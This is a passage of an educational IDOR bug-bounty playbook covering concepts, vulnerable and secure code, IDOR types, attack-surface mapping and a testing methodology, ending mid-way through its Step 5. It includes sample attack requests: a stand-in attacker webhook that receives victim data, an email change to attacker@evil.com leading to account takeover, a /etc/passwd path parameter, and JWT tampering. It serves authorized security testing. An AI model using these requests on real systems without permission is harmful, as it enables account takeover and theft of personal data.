# 🔓 IDOR — Insecure Direct Object Reference

### The Complete Bug Hunter's Playbook

> **From Zero to P1 Bounties**
> Concepts · Methodology · Burp Suite Integration · Real-World Exploitation · Escalation · Reporting
>
> Author: **Vishal** | Last Updated: February 2026
>
> _"IDOR is the vulnerability that keeps giving. It's simple to understand, hard to automate, and devastating when found."_
> — **The Web Application Hacker's Handbook**

---

## ⚠️ Legal Disclaimer

> Everything in this document is for **educational purposes** and **authorized security testing only**.
> Never test on systems you do not own or have **explicit written permission** to test.
> Unauthorized access to computer systems is a **criminal offense** under laws including the CFAA (US), IT Act (India), and Computer Misuse Act (UK).
> The author accepts **no liability** for any misuse of the techniques described here.

---

## 📋 Table of Contents

| # | Section | What You'll Learn |
|---|---------|-------------------|
| 1 | [What is IDOR?](#1--what-is-idor) | Core concept, why it exists, mental model |
| 2 | [Why IDOR Matters](#2--why-idor-matters) | Impact, real breach data, bounty payouts |
| 3 | [The Object Reference Model](#3--the-object-reference-model) | How apps reference objects, direct vs indirect |
| 4 | [Types of IDOR](#4--types-of-idor) | All variants with examples |
| 5 | [Where to Look — Attack Surface Mapping](#5--where-to-look--attack-surface-mapping) | Endpoints, patterns, hidden spots |
| 6 | [IDOR Methodology — Step by Step](#6--idor-methodology--step-by-step) | Complete hunting process |
| 7 | [Burp Suite Setup for IDOR Hunting](#7--burp-suite-setup-for-idor-hunting) | Configuration, extensions, workflow |
| 8 | [Hands-On Lab: testphp.vulnweb.com](#8--hands-on-lab-testphpvulnwebcom) | Guided walkthrough on a live target |
| 9 | [Real-World Hunting Walkthrough](#9--real-world-hunting-walkthrough) | Methodology on a production app |
| 10 | [Bypassing Protections](#10--bypassing-protections) | When devs try to stop you |
| 11 | [Escalation Techniques](#11--escalation-techniques) | Turning P4 into P1 |
| 12 | [Chaining IDOR with Other Vulns](#12--chaining-idor-with-other-vulns) | Combo attacks for max impact |
| 13 | [Automation & Scripting](#13--automation--scripting) | Python scripts, Burp macros, Autorize |
| 14 | [Real Bug Bounty Case Studies](#14--real-bug-bounty-case-studies) | Disclosed reports analysis |
| 15 | [Writing the Report](#15--writing-the-report) | Templates, CVSS scoring, proof of concept |
| 16 | [IDOR Checklist](#16--idor-checklist) | Quick reference during hunting |
| 17 | [Resources & References](#17--resources--references) | Books, labs, further reading |

---

## 1. 🧠 What is IDOR?

### The One-Line Definition

**IDOR (Insecure Direct Object Reference)** occurs when an application uses **user-supplied input** to directly access objects (files, database records, resources) **without verifying that the user is authorized** to access that specific object.

### The Mental Model — Think Like This

Imagine a hospital with numbered rooms. You're Patient #105 and your medical file is in Room 105. The nurse gives you a key labeled "105" and says _"go get your file."_

Now — what stops you from walking to Room 106 and grabbing someone else's file?

**Nothing.** The hospital trusted the room number on your key instead of checking whether **you** are allowed to access Room 106's file.

That's IDOR. The application trusts the **reference** (the number) instead of validating **authorization** (are you the owner?).

### Technical Breakdown

In web applications, objects are referenced through identifiers:

```
https://example.com/api/users/1337/profile
                              ^^^^
                      This is the Object Reference
```

When you're logged in as User 1337 and you see your profile at that URL, the application is using a **direct object reference** — the actual database ID.

**The vulnerability exists when:**

```
1. You're logged in as User 1337
2. You change the URL to /api/users/1338/profile
3. You see User 1338's private profile
4. The server NEVER checked: "Is User 1337 allowed to see User 1338's data?"
```

### Why Does IDOR Exist?

Developers make a **fundamental assumption**:

> _"The user will only send requests that my UI generates."_

This is wrong because:
- Attackers don't use the UI — they use **Burp Suite, curl, Python scripts**
- Request parameters can be **tampered with** before they reach the server
- Frontend validation is **not security** — it's UX

### The Root Cause — Missing Server-Side Authorization

Every IDOR vulnerability traces back to the same root cause:

```
┌──────────────────────────────────────────────────────────┐
│                    THE IDOR EQUATION                      │
│                                                          │
│   User Input (ID/Reference)                              │
│         +                                                │
│   Direct Database Lookup                                 │
│         +                                                │
│   NO Authorization Check  ← THIS IS THE BUG             │
│         =                                                │
│   IDOR Vulnerability                                     │
└──────────────────────────────────────────────────────────┘
```

### Vulnerable Code vs Secure Code

**❌ Vulnerable (Python/Flask):**

```python
@app.route('/api/invoice/<invoice_id>')
def get_invoice(invoice_id):
    # Fetches invoice by ID — but NEVER checks who owns it
    invoice = db.query("SELECT * FROM invoices WHERE id = %s", invoice_id)
    return jsonify(invoice)
```

Any authenticated user can access ANY invoice by changing the `invoice_id`.

**✅ Secure (Python/Flask):**

```python
@app.route('/api/invoice/<invoice_id>')
@login_required
def get_invoice(invoice_id):
    # Fetches invoice AND verifies ownership
    invoice = db.query(
        "SELECT * FROM invoices WHERE id = %s AND user_id = %s",
        invoice_id, current_user.id
    )
    if not invoice:
        abort(403)  # Forbidden — not your invoice
    return jsonify(invoice)
```

The difference? **One SQL clause: `AND user_id = %s`**. That's often all that separates a vulnerable app from a secure one.

### IDOR in the OWASP Classification

IDOR falls under **OWASP Top 10 — A01:2021 Broken Access Control**, which is the **#1 most critical web application security risk**. It was previously categorized as A5 in OWASP 2017.

```
OWASP Top 10 (2021)
├── A01: Broken Access Control  ◄── IDOR lives here
│   ├── IDOR (Direct Object Reference)
│   ├── Forced Browsing
│   ├── Privilege Escalation
│   ├── Missing Function-Level Access Control
│   └── CORS Misconfiguration
├── A02: Cryptographic Failures
├── A03: Injection
└── ...
```

### Key Terminology

| Term | Meaning |
|------|---------|
| **Object** | Any resource — user profile, invoice, file, API record, message |
| **Reference** | The identifier used to access it — numeric ID, UUID, filename |
| **Direct** | The reference maps directly to the backend object (e.g., DB primary key) |
| **Indirect** | The reference is mapped through a server-side table (secure pattern) |
| **Horizontal IDOR** | Accessing another user's data **at the same privilege level** |
| **Vertical IDOR** | Accessing data/functions of a **higher privilege level** (admin) |
| **BOLA** | Broken Object Level Authorization — the API-specific name for IDOR |

> 💡 **Note:** In API security (OWASP API Top 10), IDOR is called **BOLA — Broken Object Level Authorization** and it's ranked **#1** — the most common API vulnerability.

---

## 2. 💰 Why IDOR Matters

### The Business Impact

IDOR isn't just a "medium severity" checkbox vulnerability. When exploited at scale, it becomes a **data breach**.

Consider what an attacker can do:

```
Single IDOR in /api/users/{id}/profile
    × 10,000 users in the database
    = Complete user database exfiltration

Single IDOR in /api/orders/{id}/receipt
    × 500,000 orders
    = Full financial data leak (names, addresses, payment info)

Single IDOR in /api/documents/{id}/download
    × Government documents, medical records, legal files
    = Regulatory nightmare (GDPR, HIPAA, PCI-DSS violations)
```

### Real Breach Data

| Year | Company | IDOR Impact | Consequence |
|------|---------|-------------|-------------|
| 2019 | **First American Financial** | 885 million records exposed via IDOR in document URLs | Stock dropped, $500K+ fine, class action lawsuit |
| 2018 | **Facebook** | IDOR in "View As" feature led to 50M account token theft | $5B FTC fine (combined with other issues) |
| 2021 | **Parler** | Sequential post IDs allowed full platform scrape including deleted posts + GPS data | Platform data archived publicly before shutdown |
| 2020 | **US DoD** | IDOR in military application exposed service members' PII | Critical national security finding via HackerOne |
| 2022 | **Indian Govt Portal** | IDOR exposed Aadhaar numbers, COVID vaccination records of millions | Reported by security researchers |

### Bug Bounty Payouts for IDOR

IDOR consistently pays well because it has **direct data impact**:

```
┌─────────────────────────────────────────────────────────────┐
│              IDOR BUG BOUNTY PAYOUT RANGES                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Read-only IDOR (view other user's data)                    │
│  ├── Low-sensitivity data:     $150  — $500                 │
│  ├── PII (email, phone, name): $500  — $2,000               │
│  └── Financial/medical data:   $2,000 — $5,000              │
│                                                             │
│  Write IDOR (modify other user's data)                      │
│  ├── Profile modification:     $500  — $2,000               │
│  ├── Settings/config change:   $1,000 — $4,000              │
│  └── Account takeover chain:   $3,000 — $15,000             │
│                                                             │
│  Delete IDOR (delete other user's resources)                │
│  ├── Non-critical resources:   $500  — $1,500               │
│  └── Critical data deletion:   $2,000 — $7,000              │
│                                                             │
│  Admin/Privilege IDOR                                       │
│  ├── Access admin functions:   $3,000 — $10,000             │
│  └── Full admin takeover:      $5,000 — $25,000+            │
│                                                             │
│  Mass data exfiltration via IDOR                            │
│  └── Enumerable + sensitive:   $5,000 — $50,000+            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

> 📖 **From "Bug Bounty Bootcamp" by Vickie Li:**
> _"IDOR bugs are some of the most impactful vulnerabilities you can find. They are also the most common access control issues reported on bug bounty platforms. If you learn to find them consistently, you will always have bugs to report."_

### Why Developers Keep Making This Mistake

1. **Framework defaults don't enforce object-level auth** — Django, Rails, Express give you routing, not per-object permissions
2. **It's invisible in code review** — The absence of a check is harder to spot than bad code
3. **It works fine in testing** — QA tests with one account; they never try cross-account access
4. **API-first architecture** — Modern SPAs make hundreds of API calls, each one a potential IDOR surface
5. **Microservices** — Auth is handled by a gateway, but individual services trust internal requests blindly

---

## 3. 🏗️ The Object Reference Model

Before you can hunt IDOR, you need to deeply understand **how applications reference objects**. This section is the foundation for everything that follows.

### What is an "Object" in a Web App?

An "object" is any discrete piece of data the application manages:

```
Objects in a typical web application:
│
├── User accounts          → /api/users/482
├── Profile pictures       → /uploads/avatar_482.jpg
├── Orders                 → /api/orders/ORD-20260215-7831
├── Invoices/receipts      → /api/invoices/INV-0042
├── Messages/chats         → /api/messages/msg_a8f3e2
├── Files/documents        → /api/documents/doc_2847
├── Support tickets        → /api/tickets/TKT-1094
├── API keys               → /api/keys/ak_live_x8Kj2m
├── Payment methods        → /api/payment-methods/pm_3847
├── Notifications          → /api/notifications/notif_9921
├── Comments/reviews       → /api/reviews/rev_5523
├── Admin settings         → /api/admin/config/smtp
└── Logs/audit trails      → /api/logs/entry_88412
```

Each one has an **identifier** — and every identifier is a potential IDOR target.

### Types of Object References

#### 1. Sequential Integer IDs

The most common and **most vulnerable** pattern.

```
/api/users/1001
/api/users/1002    ← Just increment
/api/users/1003    ← Trivially enumerable
```

**Why they're dangerous:**
- Predictable — you can write a loop from 1 to 100,000
- They leak information — ID 1 is probably the admin
- They reveal scale — "There are ~50,000 users" (highest ID you find)

**Database source:** Auto-increment primary keys in MySQL/PostgreSQL

```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,   ← This becomes the IDOR target
    username VARCHAR(255),
    email VARCHAR(255)
);
```

#### 2. UUIDs (Universally Unique Identifiers)

```
/api/users/550e8400-e29b-41d4-a716-446655440000
```

**Developer assumption:** _"UUIDs are random, so they can't be guessed."_

**Reality:**
- UUIDs can **leak** in other responses, emails, URLs, JavaScript files, WebSocket messages
- UUID v1 is **time-based** and partially predictable
- If you can get ONE valid UUID (from any source), you can test IDOR

```
UUID Versions and Predictability:
│
├── v1: Timestamp + MAC address   → PARTIALLY PREDICTABLE ⚠️
├── v2: DCE security             → Rare, similar to v1
├── v3: MD5 hash of namespace    → Predictable if you know the input
├── v4: Random                   → Not guessable, but can leak
├── v5: SHA-1 hash of namespace  → Predictable if you know the input
├── v6: Reordered timestamp      → PARTIALLY PREDICTABLE ⚠️
└── v7: Unix timestamp + random  → Timestamp portion predictable ⚠️
```

> 📖 **From "The Web Application Hacker's Handbook" (Stuttard & Pinto):**
> _"Using GUIDs does not eliminate IDOR vulnerabilities. It only makes them harder to exploit through enumeration. If a GUID can be obtained from any other source — another API response, an email, a URL shared in a chat — the vulnerability is fully exploitable."_

#### 3. Encoded/Hashed References

```
/api/users/YWRtaW4=           ← Base64 of "admin"
/api/files/dXNlcl9yZXBvcnQ=   ← Base64 of "user_report"
/api/docs/5d41402abc4b2a76b9719d911017c592   ← MD5 of "hello"
```

**Developers think this is security. It's not — it's obfuscation.**

How to spot encoded references:
```
Base64:  Ends with = or ==, uses A-Z a-z 0-9 + /
Hex:     Only 0-9 a-f, often 32 chars (MD5) or 64 chars (SHA-256)
URL encoding:  %XX patterns
Base62:  A-Z a-z 0-9, often used in short URLs
```

#### 4. Composite/Complex References

```
/api/org/42/team/7/member/1001
             ^^       ^^    ^^^^
         Three separate IDs — each one testable
```

Some apps use compound references:
```
/api/reports?org_id=5&dept_id=12&report_id=883
```

**Key insight:** You may have access to org 5, but not dept 12 within it. Test **each parameter independently**.

#### 5. Filename-Based References

```
/uploads/resume_john_doe.pdf
/exports/report_2026_Q1_confidential.xlsx
/backups/db_dump_20260201.sql
```

This is IDOR through **predictable file naming**. If you know the pattern, you can guess other files.

### Direct vs Indirect Object References

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   DIRECT (Vulnerable Pattern)                                   │
│   ┌──────────┐         ┌──────────────┐                         │
│   │  Client   │─ id=42 →│   Server     │── SELECT * WHERE id=42 │
│   │          │         │ (no auth     │                         │
│   │          │←─ data ──│  check)      │                         │
│   └──────────┘         └──────────────┘                         │
│                                                                 │
│   INDIRECT (Secure Pattern)                                     │
│   ┌──────────┐         ┌──────────────┐    ┌──────────────┐     │
│   │  Client   │─ ref=A →│   Server     │───→│ Mapping Table│     │
│   │          │         │ (validates   │    │ A → id=42    │     │
│   │          │←─ data ──│  session)    │←───│ (per-session)│     │
│   └──────────┘         └──────────────┘    └──────────────┘     │
│                                                                 │
│   The client never sees the real ID.                            │
│   "ref=A" maps to id=42 ONLY for this user's session.          │
│   Another user's "ref=A" maps to a DIFFERENT object.            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4. 🎯 Types of IDOR

IDOR is not one vulnerability — it's a **family of access control failures**. Each type has different impact, different detection methods, and different severity ratings. You need to understand all of them.

### Type 1: Horizontal Privilege Escalation (User → Other User)

**This is the most common IDOR.** You access resources belonging to another user **at the same privilege level**.

```
YOU: Regular User (ID: 1001)
TARGET: Another Regular User (ID: 1002)

Your request:     GET /api/users/1001/profile → 200 OK (your data)
Tampered request: GET /api/users/1002/profile → 200 OK (THEIR data) ← IDOR!
```

**Real-world examples:**

| Endpoint | What Leaks |
|----------|-----------|
| `GET /api/users/{id}/profile` | Name, email, phone, address |
| `GET /api/orders/{id}` | Order details, shipping address, payment info |
| `GET /api/messages/{id}` | Private messages between other users |
| `GET /api/documents/{id}/download` | Private files, contracts, medical records |
| `GET /api/bank/accounts/{id}/statement` | Bank statements, transaction history |

**Severity:** Medium to Critical (depends on data sensitivity)

### Type 2: Vertical Privilege Escalation (User → Admin)

You access resources or functions that belong to a **higher privilege level**.

```
YOU: Regular User
TARGET: Admin panel, admin data, admin functions

Your request:     GET /api/users/1001/role → {"role": "user"}
Tampered request: GET /api/admin/dashboard  → 200 OK (admin data!) ← IDOR!

Or modifying your own role:
PUT /api/users/1001/role
Body: {"role": "admin"}     → 200 OK ← Vertical IDOR!
```

**Common vertical IDOR targets:**

```
/api/admin/users                → List all users
/api/admin/settings             → Modify app configuration
/api/admin/export/all-data      → Export entire database
/api/users/{id}/role            → Change user roles
/api/internal/debug             → Debug endpoints left exposed
/api/admin/impersonate/{id}     → Login as any user
```

**Severity:** High to Critical — always escalate in reports

### Type 3: Write/Modify IDOR

Not just reading — **modifying** other users' data.

```
PUT /api/users/1002/profile
Body: {"email": "attacker@evil.com"}

→ Changed victim's email → Password reset → Account Takeover
```

**Write IDOR patterns:**

```
PUT    /api/users/{id}/email         → Change email (→ ATO)
PUT    /api/users/{id}/password      → Direct password change
POST   /api/users/{id}/settings      → Modify settings
PATCH  /api/orders/{id}/address      → Redirect shipments
PUT    /api/payment/{id}/account     → Change payout account
POST   /api/users/{id}/2fa/disable   → Disable MFA (→ ATO)
```

> 📖 **From "Real-World Bug Hunting" by Peter Yaworski:**
> _"Write-based IDOR vulnerabilities are almost always rated higher severity because the attacker isn't just reading data — they're actively manipulating it. A write IDOR on an email change endpoint is essentially an account takeover vulnerability."_

**Severity:** High to Critical

### Type 4: Delete IDOR

Deleting resources that belong to other users.

```
DELETE /api/users/1002/profile-picture
DELETE /api/posts/5847
DELETE /api/documents/doc_2847
DELETE /api/users/1002    → Delete someone's entire account!
```

**Why deletion is dangerous:**
- Data loss can be **irreversible**
- Deleting an admin account = **denial of service**
- Mass deletion via automation = **data destruction attack**

**Severity:** Medium to Critical

### Type 5: State-Change IDOR

Changing the **state** or **status** of another user's objects.

```
POST /api/orders/8842/cancel         → Cancel someone's order
POST /api/tickets/TKT-1094/close     → Close their support ticket
POST /api/users/1002/suspend         → Suspend another user
POST /api/transfers/TR-441/approve   → Approve a financial transfer
POST /api/kyc/1002/verify            → Mark someone as verified
```

### Type 6: File-Based IDOR

Accessing files using predictable references.

```
GET /uploads/invoice_1001.pdf    → Your invoice
GET /uploads/invoice_1002.pdf    → Someone else's invoice ← IDOR!

GET /exports/report_user_admin.csv   → Admin's export ← IDOR!
GET /backups/db_20260201.tar.gz      → Database backup ← IDOR!
```

**Pattern variations:**

```
/attachments/{ticket_id}/{filename}
/static/avatars/{user_id}.jpg
/tmp/exports/{session_hash}/data.csv
/api/files?path=/etc/passwd              ← This crosses into LFI territory
```

### Type 7: Blind IDOR

You can't **see** the response data, but you can **infer** the vulnerability exists.

**Indicators of blind IDOR:**

```
Scenario 1: Different response codes
GET /api/users/1001/profile → 200 OK (your data)
GET /api/users/1002/profile → 200 OK (empty body, but 200!)
GET /api/users/9999/profile → 404 Not Found

The 200 vs 404 confirms user 1002 EXISTS and you queried it.

Scenario 2: Different response times
GET /api/users/1001 → 200 OK in 45ms
GET /api/users/1002 → 200 OK in 120ms (DB lookup happened!)
GET /api/users/9999 → 200 OK in 12ms  (fast = no lookup)

Scenario 3: Side effects
POST /api/users/1002/notify → 200 OK
The victim receives a notification/email — confirming the IDOR worked.
```

### Type 8: BOLA in GraphQL

GraphQL APIs are **extremely prone to IDOR** because of their query flexibility.

```graphql
# Your normal query
query {
  user(id: "1001") {
    name
    email
    orders { id, total }
  }
}

# IDOR — just change the ID
query {
  user(id: "1002") {
    name
    email
    socialSecurityNumber    # You can also request fields the UI never shows!
    orders { id, total, creditCardLast4 }
  }
}
```

**GraphQL IDOR is often worse because:**
- You can request **fields** the frontend never displays
- **Introspection** reveals all available fields
- Nested queries can traverse relationships: `user → orders → paymentMethod → cardNumber`

### Type 9: IDOR via Body Parameters / JSON

The ID isn't in the URL — it's in the **request body**.

```
POST /api/profile/update
Content-Type: application/json

{
    "user_id": 1002,          ← Change this from 1001 to 1002
    "bio": "Hacked bio"
}
```

Many bug hunters only look at URL parameters and miss body-based IDOR entirely.

**Where to look in request bodies:**

```json
{"user_id": 1002}
{"account_id": "ACC-4422"}
{"owner": "victim@email.com"}
{"target_user": "1002"}
{"recipient_id": "uuid-here"}
{"document": {"id": 2847, "action": "delete"}}
```

### Type 10: IDOR in Headers and Cookies

Some applications pass object references in **HTTP headers** or **cookies**.

```
GET /api/dashboard
Cookie: user_id=1001; session=abc123

Change to:
Cookie: user_id=1002; session=abc123
→ See user 1002's dashboard
```

```
GET /api/data
X-User-ID: 1001
X-Account-ID: ACC-1001

Change to:
X-User-ID: 1002
X-Account-ID: ACC-1002
```

### Quick Reference: IDOR Types at a Glance

```
┌────────────────────┬──────────┬────────────────────────────────────────┐
│ Type               │ Severity │ Key Indicator                          │
├────────────────────┼──────────┼────────────────────────────────────────┤
│ Horizontal (Read)  │ Med-High │ Viewing other users' data              │
│ Vertical           │ High-Crit│ Accessing admin functions               │
│ Write/Modify       │ High-Crit│ Changing other users' data             │
│ Delete             │ Med-Crit │ Removing other users' resources        │
│ State-Change       │ Med-High │ Altering status/workflow of objects    │
│ File-Based         │ Med-Crit │ Accessing files via predictable names  │
│ Blind              │ Low-Med  │ Inferring access without seeing data   │
│ GraphQL BOLA       │ High-Crit│ Querying arbitrary objects + fields    │
│ Body Parameter     │ Med-Crit │ ID hidden in POST body, not URL        │
│ Header/Cookie      │ Med-High │ Reference passed in headers/cookies    │
└────────────────────┴──────────┴────────────────────────────────────────┘
```

---

## 5. 🗺️ Where to Look — Attack Surface Mapping

The biggest mistake beginner bug hunters make is testing random endpoints. Elite hunters **systematically map the attack surface first**, then test methodically. This section teaches you exactly where IDOR hides.

### The Golden Rule

> **Any endpoint that takes an identifier as input is a potential IDOR target.**
> — Every bug bounty hunter, ever

### Phase 1: Identify All Object References

When you browse a target application, **every single request** in Burp's HTTP History is a data point. You're looking for patterns.

**In URLs (Path Parameters):**

```
GET /api/v2/users/48291/profile
GET /api/v2/users/48291/orders
GET /api/v2/users/48291/settings
GET /api/v2/orders/ORD-882341
GET /api/v2/invoices/INV-2026-0442
GET /api/v2/documents/d8f2a1b4-c3e7-4a12-b8d1-9f2e3c4d5a6b
GET /api/v2/files/uploads/48291/avatar.jpg
```

**In Query Parameters:**

```
GET /dashboard?user_id=48291
GET /search?author_id=48291&category=5
GET /export?report_id=R-2026-0442&format=pdf
GET /share?token=abc123def456
GET /redirect?url=https://internal-service/admin
```

**In POST/PUT/PATCH Bodies:**

```json
POST /api/update-profile
{"user_id": 48291, "name": "Vishal"}

PUT /api/transfer
{"from_account": "ACC-1001", "to_account": "ACC-1002", "amount": 500}

PATCH /api/permissions
{"target_user": 48291, "role": "moderator"}
```

**In Headers:**

```
X-User-ID: 48291
X-Organization-ID: org_5521
X-Account: ACC-1001
Authorization: Bearer eyJ...(JWT containing user_id)
```

**In Cookies:**

```
Cookie: user_id=48291; org=5521; role=user
```

### Phase 2: Map the High-Value Endpoints

Not all IDOR targets are equal. Focus on endpoints where the **impact is highest**:

```
🔴 CRITICAL — Always Test These First:
├── Account/profile endpoints        → PII exposure
├── Password/email change            → Account takeover
├── Payment/billing endpoints        → Financial data
├── File download/upload             → Sensitive documents
├── Admin/internal endpoints         → Privilege escalation
├── API key/token endpoints          → System compromise
└── Data export endpoints            → Mass exfiltration

🟡 HIGH — Test After Critical:
├── Order/transaction history        → Financial data
├── Messaging/chat endpoints         → Private communications
├── Notification endpoints           → Information disclosure
├── Settings/preferences             → Configuration tampering
└── Search endpoints with filters    → Data enumeration

🟢 MEDIUM — Test When You Have Time:
├── Public profile endpoints         → Hidden field exposure
├── Like/vote/rating endpoints       → Manipulation
├── Comment/review endpoints         → Impersonation
├── Follow/friend endpoints          → Social manipulation
└── Activity log endpoints           → Behavioral tracking
```

### Phase 3: Hidden IDOR Surfaces Most Hunters Miss

These are the spots that make the difference between finding 0 IDORs and finding 5:

#### 1. API Versioning Endpoints

```
/api/v1/users/1002/profile    ← Old version might lack auth checks
/api/v2/users/1002/profile    ← New version is patched
/api/v3/users/1002/profile    ← Beta might be unprotected
/api/internal/users/1002      ← Internal API exposed
```

> 📖 **From "Hacking APIs" by Corey Ball:**
> _"API versioning is a goldmine for IDOR hunters. Older API versions often have weaker access controls because security improvements were only applied to newer versions. Always test v1, v2, and any other versions you discover."_

#### 2. Webhook and Callback URLs

```
POST /api/webhooks/setup
{"url": "https://attacker.com/webhook", "user_id": 1002}

→ Receive victim's events at your webhook endpoint
```

#### 3. Export/Report Generation

```
GET /api/export/users/1002/data?format=csv
GET /api/reports/generate?user_id=1002&type=financial
POST /api/export/bulk?ids=[1001,1002,1003,1004,1005]
```

Export endpoints often have **weaker auth** because they're built as internal tools.

#### 4. Invitation and Sharing Features

```
POST /api/teams/invite
{"team_id": "team_42", "email": "attacker@evil.com"}

→ Invite yourself to someone else's team
```

#### 5. JWT Token Claims

Decode JWT tokens — they often contain user IDs that the server **trusts without re-validating**:

```
Header.Payload.Signature

Payload (decoded):
{
  "sub": "1001",        ← Change to 1002
  "role": "user",       ← Change to "admin"
  "org_id": "org_42",   ← Change to another org
  "exp": 1772012400
}
```

If the server doesn't validate the signature properly (or uses `alg: none`), you can forge tokens.

#### 6. WebSocket Messages

```javascript
// WebSocket connection
ws.send(JSON.stringify({
    "action": "get_messages",
    "conversation_id": "conv_OTHER_USER"  // ← IDOR in real-time
}));
```

#### 7. Mobile API Endpoints

Mobile apps often use **different API endpoints** than the web app — and they frequently have weaker authorization:

```
Web:    /api/v2/users/1001/profile    (patched)
Mobile: /api/mobile/users/1001/profile (vulnerable!)
iOS:    /api/ios/v1/users/1001/profile (vulnerable!)
```

Intercept mobile traffic with Burp Suite + proxy on phone to discover these.

#### 8. GraphQL Introspection

```graphql
# Ask GraphQL to tell you EVERYTHING
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

This reveals all queryable objects and fields — your IDOR attack surface.

### Phase 4: Collecting Valid IDs for Testing

You need **at least two accounts** to test IDOR. Here's how to collect valid IDs:

```
Sources of valid object IDs:
│
├── Create two accounts yourself (Account A and Account B)
├── API responses that list objects (pagination leaks)
├── Sequential patterns (if ID is 1001, try 1002)
├── JavaScript source code (hardcoded IDs, API endpoints)
├── HTML source comments (<!-- user_id: 1002 -->)
├── Public profiles / user listings
├── Sitemap.xml, robots.txt
├── Google dorks: site:target.com inurl:id=
├── Wayback Machine: old URLs with exposed IDs
├── Error messages: "User 1002 not found"
├── Email notifications (contain IDs in links)
├── PDF metadata (exported reports contain references)
├── WebSocket traffic (real-time object references)
└── Response headers (X-Request-ID, X-Trace-ID)
```

---

## 6. 🔬 IDOR Methodology — Step by Step

This is the core of the document. This is what you follow every single time you sit down to hunt IDOR. Print this. Memorize it. It works.

### Overview: The 7-Step IDOR Hunting Process

```
┌─────────────────────────────────────────────────────────────────────┐
│                     IDOR HUNTING METHODOLOGY                        │
│                                                                     │
│   Step 1: Account Setup (2 accounts minimum)                        │
│       ↓                                                             │
│   Step 2: Functionality Mapping (use the app as a real user)        │
│       ↓                                                             │
│   Step 3: Request Cataloging (Burp HTTP history analysis)           │
│       ↓                                                             │
│   Step 4: Identify Object References (IDs, UUIDs, filenames)        │
│       ↓                                                             │
│   Step 5: Cross-Account Testing (swap IDs between accounts)         │
│       ↓                                                             │
│   Step 6: Verify & Prove Impact (confirm data belongs to other)     │
│       ↓                                                             │
│   Step 7: Escalate & Report (maximize severity, write report)       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

### Step 1: Account Setup

Before you touch the target, set up your testing environment.

**Minimum: Two accounts on the target application.**

```
Account A (Attacker):
├── Email: testuser_attacker@youremail.com
├── Username: attacker_test_001
├── Role: Regular user
└── Purpose: This is YOUR session. You'll make requests from here.

Account B (Victim):
├── Email: testuser_victim@youremail.com
├── Username: victim_test_002
├── Role: Regular user
└── Purpose: You'll try to access THIS account's data from Account A.
```

**Why two accounts?**
- You need Account B's **known data** to confirm IDOR works
- If you access Account B from Account A and see data you **created** in Account B — that's confirmed IDOR
- Single-account testing can lead to **false positives** (you see your own cached data)

**Pro tip:** Use email aliases:
```
Gmail: yourname+attacker@gmail.com, yourname+victim@gmail.com
(Both arrive in the same inbox)
```

**For privilege-based testing, if possible create:**
```
Account C: Admin/moderator (if self-registration allows role selection)
Account D: Organization owner (different org context)
```

---

### Step 2: Functionality Mapping

Log into Account B first. **Use every feature**. Create data so it exists for testing.

**Account B — Create test data:**

```
☐ Complete profile with unique info ("VICTIM_PROFILE_TEST")
☐ Upload a profile picture
☐ Create an order / transaction
☐ Send a message to someone
☐ Create a document / file
☐ Generate a report / export
☐ Create a support ticket
☐ Set up payment method (if test environment)
☐ Create a team / organization
☐ Change settings to non-default values
☐ Create API keys (if available)
```

**Why create identifiable data?**

When you later test from Account A, you need to recognize Account B's data. If Account B's profile bio says `"VICTIM_PROFILE_TEST"`, and you see that string from Account A's session — **confirmed IDOR, no ambiguity**.

Now log into Account A and do the same. You now have two accounts with known, distinguishable data.

---

### Step 3: Request Cataloging with Burp Suite

With Burp proxy active, **use every feature of the application from Account A**. Click every button, visit every page, submit every form.

**In Burp → HTTP History, you're looking for:**

```
Filter Burp HTTP History:
├── Show only in-scope requests
├── Hide image/CSS/JS/font requests
├── Focus on API calls (JSON responses)
├── Sort by URL to group similar endpoints
```

**Create a spreadsheet / notes document:**

```
┌─────┬──────────────────────────────────────┬───────┬──────────────┬──────────┐
│  #  │ Endpoint                             │Method │ ID Parameter │ Purpose  │
├─────┼──────────────────────────────────────┼───────┼──────────────┼──────────┤
│ 1   │ /api/users/{id}/profile              │ GET   │ id=48291     │ View     │
│ 2   │ /api/users/{id}/profile              │ PUT   │ id=48291     │ Update   │
│ 3   │ /api/orders/{order_id}               │ GET   │ ORD-882341   │ View     │
│ 4   │ /api/messages?conv_id={id}           │ GET   │ conv_442     │ Read     │
│ 5   │ /api/documents/{doc_id}/download     │ GET   │ doc_2847     │ Download │
│ 6   │ /api/settings                        │ PUT   │ (body: id)   │ Modify   │
│ 7   │ /api/export?user_id={id}             │ GET   │ 48291        │ Export   │
└─────┴──────────────────────────────────────┴───────┴──────────────┴──────────┘
```

---

### Step 4: Identify Object References

Go through your cataloged requests and **highlight every parameter that looks like an object reference**.

**Pattern recognition:**

```
Numeric IDs:        1001, 48291, 7, 999999
UUIDs:              550e8400-e29b-41d4-a716-446655440000
String IDs:         ORD-882341, TKT-1094, INV-2026-0442
Encoded values:     YWRtaW4= (base64), 5d41402abc4b2a (hex)
Hashed values:      a1b2c3d4e5f6... (MD5/SHA)
Email references:   user@example.com (in body)
Username refs:      "owner": "john_doe"
Filenames:          report_48291.pdf, avatar_1001.jpg
Composite:          /org/5/team/12/user/48291
```

**Check EVERY HTTP method for each endpoint:**

```
GET    /api/users/48291   → Read IDOR
POST   /api/users/48291   → Create IDOR  
PUT    /api/users/48291   → Update IDOR
PATCH  /api/users/48291   → Partial update IDOR
DELETE /api/users/48291   → Delete IDOR
```

Just because GET is protected doesn't mean PUT or DELETE is!

---

### Step 5: Cross-Account Testing (The Core Test)

This is where you find the bugs. **Stay logged in as Account A. Replace Account A's IDs with Account B's IDs.**

**Process:**

```
1. In Burp, find a request from Account A:
   GET /api/users/48291/profile
   Cookie: session=ACCOUNT_A_SESSION

2. Send to Repeater (Ctrl+R)

3. Replace Account A's ID with Account B's ID:
   GET /api/users/48292/profile        ← Changed 48291 → 48292
   Cookie: session=ACCOUNT_A_SESSION   ← Same session (Account A)

4. Send the request

5. Analyze the response:
   → 200 + Account B's data = CONFIRMED IDOR ✅
   → 200 + Empty/your data  = Possible blind IDOR, investigate
